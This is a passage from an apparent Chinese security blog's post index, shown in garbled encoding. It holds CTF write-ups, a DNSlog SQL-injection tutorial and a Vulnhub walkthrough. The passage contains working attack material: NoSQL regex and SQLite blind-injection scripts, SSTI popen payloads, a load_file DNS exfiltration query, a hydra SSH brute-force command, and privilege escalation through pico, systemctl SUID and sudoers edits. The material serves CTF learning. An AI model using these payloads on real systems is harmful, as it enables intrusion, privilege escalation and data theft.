Flask,render_template,request,session,redirect\nimport pymongo\nimport os\nfrom functools import wraps\nfrom datetime import timedelta\nfrom hashlib import md5\nfrom time import sleep\n\napp = Flask(__name__)\napp.secret_key = os.environ['SECRET_KEY']\n\n# db settings\nclient = pymongo.MongoClient('localhost',27017)\ndb = client.ctfdb\n\ndef createChalls():\n\tdb.challs.insert_one({\"_id\": \"28c8edde3d61a0411511d3b1866f0636\",\"challenge_name\": \"Crack It\",\"category\": \"hash\",\"challenge_description\": \"My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{<password>}\",\"challenge_flag\": \"CTFC{cryptocat}\",\"points\": \"500\",\"released\": \"True\"})\n\tdb.challs.insert_one({\"_id\": \"665f644e43731ff9db3d341da5c827e1\",\"challenge_name\": \"MeoW sixty IV\",\"category\": \"crypto\",\"challenge_description\": \"hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters\",\"challenge_flag\": \"CTFC{n0w_g0_4_th3_r34L_fl4G}\",\"points\": \"1000\",\"released\": \"True\"})\n\tdb.challs.insert_one({\"_id\": \"38026ed22fc1a91d92b5d2ef93540f20\",\"challenge_name\": \"ImPAWSIBLE\",\"category\": \"web\",\"challenge_description\": \"well, this challenge is not fully created yet, but we have the flag for it\",\"challenge_flag\": os.environ['CHALL_FLAG'],\"points\": \"1500\",\"released\": \"False\"})\n\n# login check\ndef check_login(f):\n\t@wraps(f)\n\tdef wrap(*args,**kwrags):\n\t\tif 'user' in session:\n\t\t\treturn f(*args,**kwrags)\n\t\telse:\n\t\t\treturn render_template('dashboard.html')\n\treturn wrap\n\n# routes\nfrom user import routes\n\n@app.route('/')\n@check_login\ndef dashboard():\n\tchalls = []\n\tfor data in db.challs.find():\n\t\tdel data['challenge_flag']\n\t\tchalls.append(data)\t\n\tchall_1 = challs[0]\n\tchall_2 = challs[1]\n\treturn render_template('t_dashboard.html',username=session['user']['username'],chall_1=chall_1,chall_2=chall_2)\n\n@app.route('/register')\ndef register():\n\treturn render_template('register.html')\n\n@app.route('/login')\ndef login():\n\treturn render_template('login.html')\n\n@app.route('/logout')\ndef logout():\n\tsession.clear()\n\treturn redirect('/')\n\n@app.route('/submit_flag',methods=['POST'])\n@check_login\ndef submit_flag():\n\t_id = request.json.get('_id')[-1]\n\tsubmitted_flag = request.json.get('challenge_flag')\n\tchall_details = db.challs.find_one(\n\t\t\t{\n\t\t\t\"_id\": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),\n\t\t\t\"challenge_flag\":submitted_flag\n\t\t\t}\n\t)\n\tif chall_details == None:\n\t\treturn \"wrong flag!\"\n\telse:\n\t\treturn \"correct flag!\"\n\n# wait untill mongodb start then create the challs in db\nsleep(10)\ncreateChalls()\n~~~\n\nèƒ½çœ‹å‡ºæ˜¯`MongoDB`å¯ä»¥ç”¨`$regex` è¿›è¡Œæ­£åˆ™åŒ¹é…\n\nexp:\n\n~~~\nimport requests, string\nfrom urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n\nheaders = {\n    'Content-Type': 'application/json'\n}\n\ncookies = {\n    'session': 'eyJ1c2VyIjp7Il9pZCI6IjNhZDFlZGRlODNkMzRmMjhiZTMwMDdiYTIxOWQzZDUyIiwidXNlcm5hbWUiOiJhc2Rhc2QifX0.ZVoXtA.-obI_0v_QOu3KgulYZCyrYukpiM'\n}       #ç™»å½•çš„session\n\nflag = ''\n\nwhile True:\n    for l in string.ascii_letters + string.digits + \"_{}\":\n        data = '{\"_id\":\"_id:3\",\"challenge_flag\":{\"$regex\":\"^' + flag + l + '.*\"}}'\n        print(data)\n        data = requests.post('https://ctfc2.ctf.intigriti.io/submit_flag', data = data, headers = headers, cookies = cookies, verify=False)\n        print(data.text)\n        if 'correct flag!' in data.text:\n            flag += l\n            print(flag)\n            break\n    else:\n        print('Failed')\n        exit(1)\n\n~~~\n\n## Bug Bank\n\næœ‰ä¸¤ç§è§£æ³•ï¼Œé¢„æœŸè§£æˆ‘ä¹Ÿæ²¡çœ‹æ‡‚ï¼Œéé¢„æœŸè§£å°±å¾ˆç®€å•äº†ï¼Œé€šè¿‡è½¬é’±çš„åŠŸèƒ½è½¬`-100000000`åŸè´¦å·å°±ä¼šå‡`-100000000`å°±ä¼šå˜æˆæ­£çš„ï¼Œå°±å¯ä»¥ä¹°flagäº†\n\né¢„æœŸè§£å¯ä»¥å‚è€ƒï¼š\n\n~~~\nhttps://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.md\n\nhttps://portswigger.net/research/hijacking-service-workers-via-dom-clobbering\n~~~\n\n## Smarty Pants\n\n~~~\n#index.php\n<?php\nif(isset($_GET['source'])){\n    highlight_file(__FILE__);\n    die();\n}\n\nrequire('/var/www/vendor/smarty/smarty/libs/Smarty.class.php');\n$smarty = new Smarty();\n$smarty->setTemplateDir('/tmp/smarty/templates');\n$smarty->setCompileDir('/tmp/smarty/templates_c');\n$smarty->setCacheDir('/tmp/smarty/cache');\n$smarty->setConfigDir('/tmp/smarty/configs');\n\n$pattern = '/(\\b)(on\\S+)(\\s*)=|javascript|<(|\\/|[^\\/>][^>]+|\\/[^>][^>]+)>|({+.*}+)/';\n\nif(!isset($_POST['data'])){\n    $smarty->assign('pattern', $pattern);\n    $smarty->display('index.tpl');\n    exit();\n}\n\n// returns true if data is malicious\nfunction check_data($data){\n\tglobal $pattern;\n\treturn preg_match($pattern,$data);\n}\n\nif(check_data($_POST['data'])){\n    $smarty->assign('pattern', $pattern);\n    $smarty->assign('error', 'Malicious Inputs Detected');\n    $smarty->display('index.tpl');\n    exit();\n}\n\n$tmpfname = tempnam(\"/tmp/smarty/templates\", \"FOO\");\n$handle = fopen($tmpfname, \"w\");\nfwrite($handle, $_POST['data']);\nfclose($handle);\n$just_file = end(explode('/',$tmpfname));\n$smarty->display($just_file);\nunlink($tmpfname);\n~~~\n\nç”¨æ¢è¡Œç¬¦ç»•è¿‡å³å¯\n\n## Bug Report Repo\n\né¦–å…ˆæ˜¯sqlç›²æ³¨ï¼Œæ•°æ®åº“æ˜¯`sqlite`ï¼Œè‡ªå·±å†™çš„è„šæœ¬ï¼Œæ•ˆç‡ä¸å¤Ÿï¼Œè¿˜æ˜¯å¾—é sqlmap\n\n~~~  py\nimport websocket\nimport string\nimport json\nstr=string.ascii_letters+string.digits+string.punctuation\nws = websocket.WebSocket()\nws.connect(\"wss://bountyrepo.ctf.intigriti.io/ws\")\nflag=''\nfor j in range(1,300):\n    aaa=False\n    for i in str:\n        # data={\"id\":f\"11 and length(sqlite_version())={j}\"}åˆ¤æ–­æ•°æ®åº“é•¿åº¦\n        # data={\"id\":f\"11 AND SUBSTR((SELECT COUNT(tbl_name) FROM sqlite_master WHERE type='table'),1,1)=CHAR({j})\"}åˆ¤æ–­è¡¨é•¿åº¦\n        #data={\"id\":f\"11 and substr((select group_concat(tbl_name) from sqlite_master where type='table' limit 0,1),{j},1)='{i}'\"}\n        data = {\"id\": f\"11 and substr((select group_concat(sql) from sqlite_master),{j},1)='{i}'\"}\n        data=json.dumps(data)\n        #print(data)\n        ws.send(data)\n        a=ws.recv()\n        print(a)\n        if 'Bug report from ethical_hacker is Open' in a:\n            aaa=True\n            flag+=i\n            print(flag)\n            break\n            #continue\n    if aaa == False:\n        print(\"ok\")\n        break\n\n~~~\n\né™„ä¸€ä¸ªåˆ«çš„å¸ˆå‚…å†™çš„è„šæœ¬\n\n~~~py\nimport string\nfrom websockets.sync.client import connect\nimport json\n\nURL = 'bountyrepo.ctf.intigriti.io'\n# ALPHABET = string.ascii_uppercase # string.ascii_letters + '{!_}'\nALPHABET = string.digits + '.'\nPAYLOAD = \"1 AND (select sqlite_version()) LIKE '{guess}%' -- -\"\n\n# flag = 'INTIGRITI' \nflag = '' \nwith connect(f\"wss://{URL}/ws\") as websocket:\n    while True:\n        for c in ALPHABET:\n            payload = PAYLOAD.format(guess=flag + c)\n            print('\\r>>>', payload, end='')\n            websocket.send(json.dumps({\"id\": payload}))\n            message = websocket.recv()\n            if 'Bug not found!' not in message:\n                flag += c\n                print()\n                print(flag)\n                break\n\n\n'''\n# PAYLOAD = \"1 AND (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') LIKE '{tables}%' -- -\"\n# tables = \"bug_reports\"\n# PAYLOAD = \"1 AND (SELECT GROUP_CONCAT(name) FROM PRAGMA_TABLE_INFO('bug_reports')) LIKE '{guess}%' --\"\n# columns = 'id,category,description,severity,cvss_score,status,reported_by,reported_date'\n'''\n~~~\n\n\n\nçˆ†å‡ºæ¥çš„ä¸€æ¡æœ‰ç”¨çš„ä¸œè¥¿\n\n~~~\ncrypt0:c4tz on /4dm1n_z0n3, really?!\n~~~\n\nè®¿é—®æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œç”¨ç»™çš„ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œä»–æ˜¯å¾—æ˜¯adminï¼Œé‚£å°±æ˜¯jwtï¼Œä½†æ˜¯ä¸çŸ¥é“å¯†é’¥å•Šï¼Œè¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº†ä¸€ä¸ªå·¥å…·`jwt-cracker`çˆ†ç ´å¯†é’¥ï¼Œå­—å…¸ç”¨`rockyou`ï¼Œkeyæ˜¯`catsarethebest`ï¼Œä¼ªé€ adminå°±okäº†\n\n## Pizza Time\n\nåªæœ‰ä¸€å¤„åŠŸèƒ½ç‚¹....\n\n~~~\nsudo nmap -sVC -T4 -Pn -vv -p 443 pizzatime.ctf.intigriti.io\n~~~\n\næ¢æµ‹webæœåŠ¡ï¼Œç”¨çš„æ˜¯ngnixï¼Œå¯ä»¥çŒœæµ‹æ˜¯`Flask/Django`æˆ–è€…`node`\n\né¦–å…ˆfuzzï¼Œå¯ä»¥çœ‹å‡ºé™¤äº†`&`å’Œ`+`çš„æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†å¤§æ‹¬å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œéš¾é“ä¸æ˜¯`SSTI`ä¹ˆï¼Ÿä¸ï¼ä»–å°±æ˜¯SSTI,`%0a`å¯ä»¥ç»•è¿‡ï¼Œå…·ä½“åŸç†æ˜¯ä»€ä¹ˆæˆ‘å¾—åˆ†æåˆ†ææºç å†å†™\n\npayload:\n\n~~~\nx%0a{{lipsum.__globals__[\"os\"].popen('cat+/etc/passwd').read()}}\n~~~\n\nä½†æ˜¯è¿™æ ·ä¼šæŠ¥500ï¼Œå°†å‘½ä»¤æ”¾è¿›headeré‡Œå°±å¯ä»¥ç»•è¿‡äº†\n\n~~~\nx%0a{{lipsum.__globals__[\"os\"].popen(request.headers.get(\"X\")).read()}}\n~~~\n\n","tags":["ctf"],"categories":["ctf","å¤ç›˜"]},{"title":"dnslogæ³¨å…¥å­¦ä¹ ","url":"/2023/10/18/dnslogæ³¨å…¥å­¦ä¹ /","content":"\n## ä»€ä¹ˆæ˜¯DNSlog\n\nDNSï¼ˆDomain Name Systemï¼‰åŸŸåæœåŠ¡ç³»ç»Ÿï¼Œç®€å•çš„è¯´å°±æ˜¯åŸŸåä¸IPè½¬æ¢æœåŠ¡ï¼Œæ¯”å¦‚ç”¨æˆ·è¾“å…¥a.com,DNSå°±ä¼šå°†a.comè§£ææ‰¾åˆ°å®ƒçœŸå®çš„ipï¼Œä»¥ä¾¿äºè®¿é—®æœåŠ¡å™¨ä¸Šçš„ç›¸å…³æœåŠ¡ï¼ŒDNSlogå°±æ˜¯å­˜å‚¨åœ¨DNSæœåŠ¡å™¨ä¸Šçš„åŸŸåä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ç”¨æˆ·å¯¹åŸŸåè®¿é—®çš„ä¿¡æ¯ï¼Œç±»ä¼¼äºæ—¥å¿—æ–‡ä»¶ã€‚\n\n## DNSlogå›æ˜¾åŸç†\n\né¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹å¤šçº§åŸŸåçš„æ¦‚å¿µ\n\n[åŸŸååˆ†çº§ä¸åŸŸåè§£æè¿‡ç¨‹(DNS)](https://blog.csdn.net/m0_37263637/article/details/85157611)\n\nå› ç‰¹ç½‘é‡‡ç”¨å±‚æ¬¡æ ‘çŠ¶ç»“æ„å‘½åæ–¹æ³•ã€‚åŸŸæ˜¯åå­—ç©ºé—´ä¸­ä¸€ä¸ªå¯è¢«ç®¡ç†çš„åˆ’åˆ†ï¼ˆæŒ‰æœºæ„ç»„ç»‡åˆ’åˆ†ï¼‰ï¼ŒåŸŸå¯è¢«åˆ’åˆ†ä¸ºå­åŸŸï¼Œå­åŸŸå¯å†è¢«åˆ’åˆ†ï¼Œå³å½¢æˆäº†é¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ã€‚ä»å³å‘å·¦ä¸ºé¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ï¼Œç”¨ç‚¹éš”å¼€ã€‚ä¾‹å¦‚`872323857.github.io`ï¼Œioå°±æ˜¯é¡¶çº§åŸŸåï¼Œgithubå°±æ˜¯äºŒçº§åŸŸåï¼Œ872323857å°±æ˜¯ä¸‰çº§åŸŸåã€‚ä¸”åŸŸåä¸åˆ†å¤§å°å†™ã€‚\n\n![](/pic/DNSLOG/DNSLOG.png)\n\né€šä¿—çš„è¯´å°±æ˜¯æˆ‘æœ‰ä¸ªå·²æ³¨å†Œçš„åŸŸåa.comï¼Œæˆ‘åœ¨åŸŸåä»£ç†å•†é‚£é‡Œå°†åŸŸåè®¾ç½®å¯¹åº”çš„ip 1.1.1.1  ä¸Šï¼Œè¿™æ ·å½“æˆ‘å‘dnsæœåŠ¡å™¨å‘èµ·a.comçš„è§£æè¯·æ±‚æ—¶ï¼ŒDNSlogä¸­ä¼šè®°å½•ä¸‹ä»–ç»™a.comè§£æï¼Œè§£æå€¼ä¸º1.1.1.1ï¼Œè€Œæˆ‘ä»¬è¿™ä¸ªè§£æçš„è®°å½•çš„å€¼å°±æ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„åœ°æ–¹ã€‚\n\nè‡ªå·±æ“ä½œä¸€ä¸‹æ‰èƒ½æ›´å¥½çš„ç†è§£ï¼Œé¦–å…ˆåœ¨http://www.dnslog.cn/ä¸Šè·å¾—ä¸€ä¸ªåŸŸåï¼Œç„¶åæˆ‘ä»¬pingä¸€ä¸‹\n\n![](/pic/DNSLOG/DNSLOG2.png)\n\næˆ‘ä»¬å°†1æ¢æˆåˆ«çš„è¯•è¯•\n\n![](/pic/DNSLOG/DNSLOG3.png)\n\nå¯ä»¥çœ‹åˆ°è§£æçš„æ—¥å¿—ä¼šæŠŠ%USERNAME%çš„å€¼ç»™å¸¦å‡ºæ¥ï¼Œå› ä¸ºç³»ç»Ÿåœ¨pingå‘½ä»¤ä¹‹å‰ä¼šå°†%USERNAME%çš„å€¼è§£æå‡ºæ¥ï¼Œç„¶åå†å’ŒåŸŸåæ‹¼æ¥èµ·æ¥ã€‚\n\n## DNSlogåˆ©ç”¨\n\n### sqlæ³¨å…¥\n\n![](/pic/DNSLOG/DNSLOG4.png)\n\nå°±ä»¥sqlç›²æ³¨ä¸ºä¾‹ï¼Œåç«¯æ•°æ®åº“ç”¨çš„mysqlæ•°æ®åº“ï¼Œè¯´ä¸€ä¸‹ç”¨dnslogå›æ˜¾åªèƒ½ç”¨äºwindowsç³»ç»Ÿï¼Œä¸ºä»€ä¹ˆå‘¢ã€‚å› ä¸ºåœ¨åˆ©ç”¨sqlç›²æ³¨è¿›è¡ŒDNSlogå›æ˜¾æ—¶ï¼Œéœ€è¦ç”¨åˆ°load_fileå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥è¿›è¡ŒDNSè¯·æ±‚ã€‚é‚£\nå’Œåªèƒ½åœ¨windowsä¸Šç”¨æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°Windowsçš„ä¸€ä¸ªå°Tipsâ€”â€”**UNCè·¯å¾„**\n\n### UNCè·¯å¾„\n\nUNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚æˆ‘ä»¬æ—¥å¸¸å¸¸ç”¨çš„ç½‘ç»œå…±äº«æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–¹å¼ã€‚\n \\abc.xxx\\test\nè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆCONCAT()å‡½æ•°æ‹¼æ¥äº†4ä¸ª\\äº†,åŒæ–œæ è¡¨ç¤ºç½‘ç»œèµ„æºè·¯å¾„å¤šåŠ ä¸¤ä¸ª\\å°±æ˜¯è½¬ä¹‰äº†åæ–œæ ã€‚\n é€šè¿‡DNSlogç›²æ³¨éœ€è¦ç”¨çš„load_file()å‡½æ•°ï¼Œæ‰€ä»¥ä¸€èˆ¬å¾—æ˜¯rootæƒé™ã€‚`show variables like '%secure%'`;æŸ¥çœ‹load_file()å¯ä»¥è¯»å–çš„ç£ç›˜ã€‚\n 1ã€å½“secure_file_privä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚\n 2ã€å½“secure_file_privä¸ºG:\\ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„æ–‡ä»¶ã€‚\n 3ã€å½“secure_file_privä¸ºnullï¼Œload_fileå°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚\n é€šè¿‡è®¾ç½®my.iniæ¥é…ç½®ã€‚secure_file_priv=\"\"å°±æ˜¯å¯ä»¥load_flieä»»æ„ç£ç›˜çš„æ–‡ä»¶ã€‚\n\nåœ¨mysqlä¸­æ‰§è¡Œå‘½ä»¤`select load_file('\\\\\\\\a.a92pjl.dnslog.cn\\\\a');`å¯ä»¥çœ‹åˆ°\n\n![](/pic/DNSLOG/DNSLOG5.png)\n\nå’Œä¹‹å‰çš„ç»“åˆèµ·æ¥æ„é€ è¯­å¥,ç”¨sqlié¶åœºæ¥æµ‹è¯•\n\n~~~\n' and if((select load_file(concat('\\\\\\\\',(select database()),'.\nbhf0ay.dnslog.cn\\\\abc'))),1,0)--+\n~~~\n\n![](/pic/DNSLOG/DNSLOG6.png)\n\n## å°ç»“\n\nDNSlogæ³¨å…¥ä¸æ­¢å¯ä»¥ç”¨äºsqlæ³¨å…¥ï¼Œè¿˜å¯ä»¥ç”¨äºxssï¼Œxxeï¼Œssrfç­‰ï¼Œæ€è·¯æ‰“å¼€ã€‚\n\nå¯ä»¥å‚è€ƒï¼š\n\nhttps://www.cnblogs.com/Xy--1/p/12896599.html\n","tags":["web","sqlæ³¨å…¥"],"categories":["web"]},{"title":"SYSTEM_FAILURE_1é¶åœº","url":"/2023/09/16/SYSTEM-FAILURE-1é¶åœº/","content":"\nè·Ÿç€åˆ«äººçš„è§†é¢‘æ‰“ä¸€ä¸‹ã€‚\n\né¶åœºç›´æ¥å°±ç»™äº†ipåœ°å€ï¼Œç”¨nmapæ‰«ä¸€ä¸‹ç«¯å£\n\n![](/pic/sf1/1.png)\n\nå¼€æ”¾äº†445ç«¯å£,445ç«¯å£é»˜è®¤å¼€æ”¾çš„æ˜¯SMBæœåŠ¡ï¼Œå¯ä»¥åˆ©ç”¨ç›¸å…³çš„å·¥å…·,`smbclient`ã€`smbmap`\n\n![](/pic/sf1/2.png)\n\nç”¨`smbmap`æ‰«æå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªåŒ¿åçš„å…±äº«,ç”¨`smbclient` //ip/anonymousè¿æ¥ï¼Œç©ºå¯†ç ç›´æ¥å›è½¦å°±è¡Œã€‚\n\n![](/pic/sf1/3.png)\n\næŸ¥çœ‹æ–‡ä»¶å‘ç°åªæœ‰ä¸€ä¸ªshareï¼Œç”¨`get share`ä¸‹è½½ä¸‹æ¥,æŸ¥çœ‹shareæ–‡ä»¶ã€‚\n\n![](/pic/sf1/4.png)\n\nç»™äº†`Admin`å’Œ`89492D216D0A212F8ED54FC5AC9D340B`ï¼ŒçŒœæµ‹æ˜¯è´¦å·å¯†ç ï¼Œmd5è§£å¯†å¾—`qazwsxedc`ï¼Œç”¨xftpè¿æ¥ï¼Œæˆ–è€…ç”¨lftpè¿æ¥ä¹Ÿå¯ä»¥ã€‚\n\n![](/pic/sf1/5.png)\n\nftpå¯ä»¥è¿æ¥ï¼Œsshè¯•è¿‡ä¹‹åä¹Ÿå¯ä»¥è¿æ¥ã€‚åˆ©ç”¨`linpeas.sh`æœé›†ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ä»¥ææƒçš„ä¸œè¥¿\n\n> å·¥å…·åœ°å€ï¼šhttps://github.com/carlospolop/PEASS-ng\n\n![](/pic/sf1/6.png)\n\nä½†æ˜¯ç”¨æˆ·æƒé™å¤ªä½ï¼Œæ²¡æœ‰åŠæ³•ææƒã€‚\n\ncdåˆ°/Syst3m/F4iluR3,é‡Œé¢æœ‰å¾ˆå¤šæ–‡ä»¶\n\n![](/pic/sf1/7.png)\n\nä»–ä»¬çš„å¤§å°ä¹Ÿéƒ½å·®ä¸å¤šï¼Œç”¨`find ./ -size +1696c`å‘½ä»¤æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ä¸æ­£å¸¸çš„æ–‡ä»¶,ç¡®å®èƒ½æ‰¾åˆ°`file0189.txt`ï¼Œç”¨`diff`å‘½ä»¤å¯ä»¥æ¯”ä¸€ä¸‹ä»–ä¸å…¶ä»–çš„æ–‡ä»¶æœ‰ä»€ä¹ˆä¸åŒï¼Œä½†æ˜¯å‘ç°æ–‡ä»¶å†…å®¹æ˜¯ä¸€è¡Œçš„ï¼Œæ‰€ä»¥è¦ç»™ä»–ä»¬å˜æˆå•è¡Œçš„ã€‚\n\n`cat file0189.txt |xargs -n 1 > /tmp/tmp1` `cat file.txt |xargs -n 1 > /tmp/tmp1`ç„¶åå†ç”¨diffåˆ¤æ–­ä»–ä»¬æœ‰ä»€ä¹ˆä¸åŒã€‚\n\n\n\n![](/pic/sf1/9.png)\n\nå‘ç°åé¢æœ‰ä¸€ä¸²ä¸ä¸€æ ·çš„ï¼Œéœ€è¦è§£å¯†ï¼Œbase62è§£å¯†å¾—åˆ°`/Sup3rS3cR37`\n\nè¿™ä¸ªæ–‡ä»¶å¤¹åœ¨`/var/www/html/area4`é‡Œ,ä¸‹è½½useful.txtï¼ŒæŸ¥çœ‹`/etc/passwd`èƒ½å‘ç°ç”¨æˆ·åï¼Œåˆ©ç”¨`hydra`è¿›è¡Œçˆ†ç ´\n\n![](/pic/sf1/10.png)\n\nå‘½ä»¤:`hydra -L user.txt -P useful.txt ssh://192.168.2.243 -V -I -u -e nsr`  \n\n~~~\n-V æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯\n-I å¿½ç•¥ç°æœ‰çš„æ¢å¤æ–‡ä»¶ï¼ˆä¸è¦ç­‰å¾… 10 ç§’ï¼‰\n-e â€œnâ€è¡¨ç¤ºç©ºå¯†ç ï¼Œâ€œsâ€å°è¯•ç™»å½•ä¸ºé€šè¿‡ï¼Œâ€œrâ€å°è¯•åå‘ç™»å½•ä¸ºé€šè¿‡\n~~~\n\n![](/pic/sf1/11.png)\n\nå¯ä»¥çˆ†ç ´å‡ºæ¥å¯†ç ï¼Œç™»å½•valexç”¨æˆ·ã€‚\n\n![](/pic/sf1/12.png)\n\n`sudo -l`ï¼šåˆ—å‡ºç”¨æˆ·å¯ä»¥æ‰§è¡Œå’Œä¸å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ã€‚\n\nå¯ä»¥å‘ç°`jin`ç”¨æˆ·å¯ä»¥ç”¨picoã€‚åœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°nanoçš„ææƒæ–¹å¼\n\næ‰§è¡Œå‘½ä»¤`sudo -u jin /usr/bin/pico` ç„¶å\n\n~~~\n^R^X\nreset; sh 1>&0 2>&0\n~~~\n\n![](/pic/sf1/14.png)\n\nç„¶åå°±åˆ°`jin`è¿™ä¸ªç”¨æˆ·äº†,è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ‰§è¡Œ`systemctl`äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨`systemctl`è¿›è¡Œææƒã€‚\n\n~~~\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"chmod +s /bin/bash\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n~~~\n\næˆ–è€…ä¿®æ”¹sudoers\n\n~~~\necho \\\"admin ALL=(ALL:ALL) ALL\">>/etc/sudoers\n~~~\n\n![](/pic/sf1/15.png)\n\nè¯»å–åˆ°root.txt\n","tags":["vulnhub"],"categories":["boot2root"]},{"title":"TFCCTF2023","url":"/2023/08/01/TFCCTF2023/","content":"\n# FORENSICS\n\n## DOWN BAD\n\nä¿®æ”¹å›¾ç‰‡çš„é«˜åº¦å°±èƒ½å¾—åˆ°flag\n\n## LIST\n\næ¯”èµ›çš„æ—¶å€™ä¸æ­£ç¡®ç­”æ¡ˆæ’è‚©è€Œè¿‡äº†ï¼Œæˆ‘çœŸè¯¥æ­»å•Šã€‚\n\né™„ä»¶ç»™äº†ä¸€ä¸ªæµé‡åŒ…ï¼Œè¿½è¸ªTCPæµèƒ½å‘ç°æœ‰ç±»ä¼¼`command=echo+%22ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAiRiIgMj4vZGV2L251bGw%3D%22+%7C+base64+-d+%7C+bash`è¿™ç§ï¼Œè§£ç æ˜¯` find /home/ctf -type f -name \"T\" 2>/dev/null`å¤šè§£ç å‡ ä¸ªå¯ä»¥å‘ç°-nameçš„å‚æ•°å°±æ˜¯flag\n\nå¯ä»¥ç”¨`strings list.pcap|grep command`è¿™ä¸ªä»£ç æ‰¾åˆ°æ‰€æœ‰çš„flagï¼Œç”¨è„šæœ¬è§£ç å¿«ä¸€ç‚¹ï¼Œä¸€ä¸ªä¸€ä¸ªè§£ç ä¹Ÿå¯ä»¥ã€‚\n\n~~~\nimport base64\n\ntraces = open(\"./2.txt\", \"r\").readlines()\n\nbase64_commands = []\n\nfor t in traces:\n    t = t.replace(\"command=echo+%22\", \"\")\n    t = t.replace(\"%22+%7C+base64+-d+%7C+bash\", \"\")\n    t = t.replace(\"%3D\", \"\")\n    t = t.strip()\n\n    print(base64.b64decode(t + \"=\" * (len(t) % 4)).decode()[30], end=\"\")\n\n~~~\n\n","tags":["ctf"],"categories":["ctf","å¤ç›˜"]},{"title":"AmateursCTF2023","url":"/2023/07/19/AmateursCTF2023/","content":"\n# WEB\n\n## waiting-an-eternity\n\n![](/pic/AmateursCTF/web1.png)\n\nçœ‹æ–‡ä»¶å¤´ï¼Œè¦ç­‰å¥½é•¿äº‹ä»¶ä¹‹åæ‰ä¼šåˆ·æ–°,ç›´æ¥è®¿é—®åé¢çš„url\n\n![](/pic/AmateursCTF/web2.png)\n\nsecretcodeæ˜¯md5è§£å¯†ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ï¼ŒCookieé‡Œæœ‰`time`æ˜¯æ—¶é—´æˆ³å°†ä»–æ”¹æˆ`NAN`æ˜¾ç¤ºflag\n\n![](/pic/AmateursCTF/web3.png)\n\n## funny factorials\n\né™„ä»¶ç»™äº†ä¸€ä¸ªapp.py\n\nå¯æ§ç‚¹åœ¨è¿™é‡Œï¼Œé€šè¿‡æ”¹å˜ä¸»é¢˜å¾—åˆ°flag\n\n~~~\ndef filter_path(path):\n    # print(path)\n    path = path.replace(\"../\", \"\")\n    try:\n        return filter_path(path)\n    except RecursionError:\n        # remove root / from path if it exists\n        if path[0] == \"/\":\n            path = path[1:]\n        print(path)\n        return path\n\n~~~\n\nå°†pathé‡Œé¢çš„`../`åˆ æ‰äº†ï¼Œå¦‚æœpathå¼€å¤´æ˜¯`/`ä¼šå¿½è§†æ‰ï¼Œä½†æ˜¯å¦‚æœé€’å½’è¶…è¿‡1000æ¬¡å°±ä¼šè¿›å…¥`RecursionError`ç„¶åè®¿é—®æ ¹ç›®å½•ä¸‹çš„flag.txtå°±è¡Œ\n\npayload:\n\n~~~\nPOST /?theme=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..